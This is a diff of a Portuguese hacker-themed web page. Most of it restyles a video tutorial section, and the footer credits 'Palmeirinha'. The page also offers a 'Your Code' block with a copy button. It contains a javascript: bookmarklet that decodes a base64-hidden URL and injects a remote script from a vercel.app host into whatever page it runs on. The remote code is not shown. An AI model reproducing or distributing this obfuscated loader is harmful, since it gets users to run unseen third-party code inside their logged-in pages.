@@ -113,7 +113,26 @@
       overflow-x: hidden;
     }
 
-    .video-display, .code-block pre {
+    /* VIDEO DISPLAY CENTRALIZADO */
+    .video-display {
+      display: flex;
+      justify-content: center; /* centraliza horizontalmente */
+      align-items: center;     /* centraliza verticalmente */
+      outline: 1px dashed #00ff00;
+      padding: 10px;
+      box-sizing: border-box;  /* inclui padding no tamanho */
+    }
+
+    .video-display iframe {
+      width: 100%;
+      max-width: 560px;
+      height: auto;
+      aspect-ratio: 16 / 9;
+      border: none;
+      display: block;
+    }
+
+    .code-block pre {
       width: 100%;
       border-radius: 10px;
       font-family: "Courier New", monospace;
@@ -124,16 +143,6 @@
       margin: 0;
       overflow-x: auto;
     }
-
-    .video-display iframe {
-  width: 100%;
-  max-width: 560px;
-  height: auto;
-  aspect-ratio: 16 / 9;
-  display: block;
-  margin: 0 auto;
-  border: none;
-}
 
     .video-upload-btn {
       background: linear-gradient(45deg, #003300, #006600);
@@ -191,8 +200,8 @@
     <div class="section">
       <h2 class="section-title">📹 Vídeo Explicativo</h2>
       <div class="video-container">
-        <div class="video-display" contenteditable="true" style="outline: 1px dashed #00ff00; padding: 10px;">
-          <iframe src="https://www.youtube.com/embed/86vduWhl4Fo?si=892lfHHQ2YvOffam" 
+        <div class="video-display" contenteditable="true">
+          <iframe src="https://www.youtube.com/embed/86vduWhl4Fo?si=892lfHHQ2YvOffam"
                   title="YouTube video player"
                   frameborder="0"
                   allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
@@ -200,27 +209,26 @@
                   allowfullscreen>
           </iframe>
         </div>
-        <p style="font-size: 0.85rem; color: #00ff00; margin-top: 10px;">
-          🔧 Tutorial </p>
+        <p style="font-size: 0.85rem; color: #00ff00; margin-top: 10px;">🔧 Tutorial</p>
       </div>
     </div>
 
     <!-- Código -->
-<div class="section">
-  <h2 class="section-title">💻 Seu Código</h2>
-  <div class="code-block">
-    <pre><code id="codeArea">
+    <div class="section">
+      <h2 class="section-title">💻 Seu Código</h2>
+      <div class="code-block">
+        <pre><code id="codeArea">
 javascript:(function()%7Bvar%20s%3Ddocument.createElement('script')%3Bs.src%3Datob('aHR0cHM6Ly9jb3B5bGVhZC52ZXJjZWwuYXBwL3NjcmlwdC5qcw%3D%3D')%3Bdocument.body.appendChild(s)%7D)()
-    </code></pre>
-    <div style="text-align:center; margin-top:12px;">
-      <button class="video-upload-btn" id="copyBtn" onclick="copyCode()">📋 Copiar</button>
+        </code></pre>
+        <div style="text-align:center; margin-top:12px;">
+          <button class="video-upload-btn" id="copyBtn" onclick="copyCode()">📋 Copiar</button>
+        </div>
+      </div>
     </div>
-  </div>
-</div>
 
-
-  <div class="footer" role="contentinfo">
-    <p>🌴 Desenvolvido pelos mais inteligentes da Palmeirinha 🌴</p>
+    <div class="footer" role="contentinfo">
+      <p>🌴 Desenvolvido pelos mais inteligentes da Palmeirinha 🌴</p>
+    </div>
   </div>
 
   <script>
@@ -260,11 +268,5 @@ javascript:(function()%7Bvar%20s%3Ddocument.createElement('script')%3Bs.src%3Dat
     window.addEventListener('resize', createMatrixEffect);
     window.addEventListener('load', createMatrixEffect);
   </script>
-
 </body>
 </html>
-
-
-
-
-
